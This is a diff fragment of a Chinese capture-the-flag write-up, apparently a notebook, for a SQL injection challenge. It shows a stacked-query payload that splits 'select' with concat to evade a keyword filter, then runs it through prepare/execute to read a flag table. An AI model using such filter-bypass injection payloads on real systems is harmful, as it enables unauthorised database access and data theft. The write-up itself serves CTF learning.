@@ -70,15 +70,14 @@ execute stmt;
 #### 使用报错注入获取数据库的名称
 
 ####  使用堆叠查询，查询表的内容
+
 ```sql
 set @sql1=concat('sel','ect group_concat(flag) from `1919810931114514` ');
 prepare stmt from @sql1;
 execute stmt;
 ```
+
+
 值得注意的是，数字名称的表需要使用`来进行保护
 <img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/ak021zj6nt9.png" width="1000px" />
 获取到flag解题完全
-
-```{.python .input}
-
-```
